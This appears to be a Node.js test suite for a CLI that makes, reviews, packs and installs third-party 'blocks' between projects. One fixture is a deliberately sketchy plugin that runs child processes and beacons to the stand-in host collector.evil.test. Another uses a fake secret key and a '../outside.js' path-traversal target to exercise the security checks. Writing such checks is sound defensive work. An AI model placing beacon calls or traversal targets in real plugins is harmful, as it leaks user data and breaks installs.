import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, readFileSync, writeFileSync, appendFileSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { makeProject, ROOT } from '../helpers.js';
import { parseAddress } from '../../src/cli/lib/registry.js';
import { review, checkItem, toRegistryItem } from '../../src/cli/lib/blocks.js';

const CALM = join(ROOT, 'bin', 'calm.js');
const calm = (cwd, ...args) => {
  const r = spawnSync(process.execPath, [CALM, ...args], { cwd, env: { ...process.env, NO_COLOR: '1', CI: '1' }, encoding: 'utf8' });
  return { code: r.status, out: `${r.stdout}${r.stderr}` };
};

let author;
let user;
before(async () => {
  author = await makeProject();
  user = await makeProject();
});
after(() => {
  author.cleanup();
  user.cleanup();
});

test('make block, check, pack, add it to another project', async () => {
  const made = calm(author.dir, 'make', 'block', 'hello-world');
  assert.equal(made.code, 0, made.out);
  for (const f of ['app/blocks/hello-world/index.js', 'app/blocks/hello-world/block.json', 'app/blocks/hello-world/README.md', 'app/blocks/hello-world/AGENTS.md', 'test/blocks/hello-world.test.js']) assert.ok(existsSync(join(author.dir, f)), f);

  // The new block is live in the app right away, with options from calm.config.js.
  writeFileSync(join(author.dir, 'calm.config.js'), "import { defineConfig } from '#calm';\nexport default defineConfig({ blocks: { 'hello-world': { greeting: 'Hi' } } });\n");
  const t = await author.testApp();
  try {
    assert.equal((await t.get('/hello-world/hello')).body.data.message, 'Hi from hello-world');
  } finally {
    await t.close();
  }

  // An extra file outside the block folder travels with it.
  mkdirSync(join(author.dir, 'app', 'jobs'), { recursive: true });
  writeFileSync(join(author.dir, 'app', 'jobs', 'hello-digest.js'), 'export default {};\n');
  const meta = JSON.parse(readFileSync(join(author.dir, 'app/blocks/hello-world/block.json'), 'utf8'));
  meta.files = ['app/jobs/hello-digest.js'];
  meta.description = 'Says hello.';
  writeFileSync(join(author.dir, 'app/blocks/hello-world/block.json'), JSON.stringify(meta, null, 2));

  const checked = calm(author.dir, 'block', 'check', 'hello-world');
  assert.equal(checked.code, 0, checked.out);
  assert.match(checked.out, /What the code does/);

  const packed = calm(author.dir, 'block', 'pack');
  assert.equal(packed.code, 0, packed.out);
  assert.match(packed.out, /calm add gh:<you>\/<repo>\/hello-world/);
  const item = JSON.parse(readFileSync(join(author.dir, 'r', 'hello-world.json'), 'utf8'));
  assert.deepEqual(item.files.map((f) => f.target).sort(), ['app/blocks/hello-world/AGENTS.md', 'app/blocks/hello-world/README.md', 'app/blocks/hello-world/index.js', 'app/jobs/hello-digest.js']);
  assert.equal(item.meta.calmapi.minVersion.length > 0, true);
  assert.deepEqual(JSON.parse(readFileSync(join(author.dir, 'r', 'index.json'), 'utf8')).items.map((i) => i.name), ['hello-world']);

  // Someone else adds it: it is reviewed as third-party code, then installed.
  const added = calm(user.dir, 'add', join(author.dir, 'r', 'hello-world.json'), '--yes', '--no-install');
  assert.equal(added.code, 0, added.out);
  assert.match(added.out, /Review/);
  assert.match(added.out, /nothing notable/);
  assert.ok(existsSync(join(user.dir, 'app/blocks/hello-world/index.js')));
  assert.ok(existsSync(join(user.dir, 'app/jobs/hello-digest.js')));

  appendFileSync(join(user.dir, 'app/blocks/hello-world/index.js'), '// my change\n');
  const listed = calm(user.dir, 'block', 'list');
  assert.match(listed.out, /hello-world/);
  assert.match(listed.out, /1 file\(s\) changed since added: app\/blocks\/hello-world\/index\.js/);
});

test('risky third-party code is flagged and needs --trust to install unattended', async () => {
  calm(author.dir, 'make', 'block', 'sketchy');
  writeFileSync(
    join(author.dir, 'app/blocks/sketchy/index.js'),
    `import { definePlugin } from '#calm';
import { execSync } from 'node:child_process';
export default definePlugin({
  name: 'sketchy',
  setup(calm) {
    calm.onStart(() => execSync('echo hi'));
    calm.use((req, _res, next) => next());
    fetch('https://collector.evil.test/beacon');
  },
});
`,
  );
  const checked = calm(author.dir, 'block', 'check', 'sketchy');
  assert.match(checked.out, /runs other programs \(child_process\)/);
  assert.match(checked.out, /sees every request/);
  assert.match(checked.out, /mentions collector\.evil\.test/);

  calm(author.dir, 'block', 'pack', 'sketchy');
  const file = join(author.dir, 'r', 'sketchy.json');
  const refused = calm(user.dir, 'add', file, '--yes', '--no-install');
  assert.notEqual(refused.code, 0);
  assert.match(refused.out, /add --trust/);
  assert.ok(!existsSync(join(user.dir, 'app/blocks/sketchy/index.js')), 'nothing was written');
  const trusted = calm(user.dir, 'add', file, '--yes', '--trust', '--no-install');
  assert.equal(trusted.code, 0, trusted.out);
});

test('checks catch broken items and committed secrets', () => {
  // Built at runtime so this file never contains a key-shaped string (GitHub push protection).
  const fakeKey = ['sk', 'live', `51H${'x'.repeat(24)}Q`].join('_');
  const secret = toRegistryItem({ name: 'leaky', version: '1.0.0', description: 'x', docs: 'x' }, [
    { target: 'app/blocks/leaky/index.js', content: `import { definePlugin } from '#calm';\nconst key = '${fakeKey}';\nexport default definePlugin({ name: 'leaky', setup() {} });\n` },
    { target: 'calm/app.js', content: '' },
    { target: '../outside.js', content: '' },
  ]);
  const findings = checkItem(secret);
  const errors = findings.filter((f) => f.level === 'error').map((f) => f.message).join('\n');
  assert.match(errors, /looks like a real secret key/);
  assert.match(errors, /cannot overwrite framework files/);
  assert.match(errors, /unsafe file target/);
  assert.equal(review([{ target: 'a.js', content: 'const x = 1;\n' }]).length, 0);
});

test('gh: addresses point at r/<name>.json in the repository', () => {
  assert.deepEqual(parseAddress('gh:ada/calm-blocks/stripe-billing'), { kind: 'url', url: 'https://raw.githubusercontent.com/ada/calm-blocks/HEAD/r/stripe-billing.json', key: 'gh:ada/calm-blocks/stripe-billing' });
  assert.equal(parseAddress('gh:ada/calm-blocks/stripe-billing@v1.2.0').url, 'https://raw.githubusercontent.com/ada/calm-blocks/v1.2.0/r/stripe-billing.json');
});
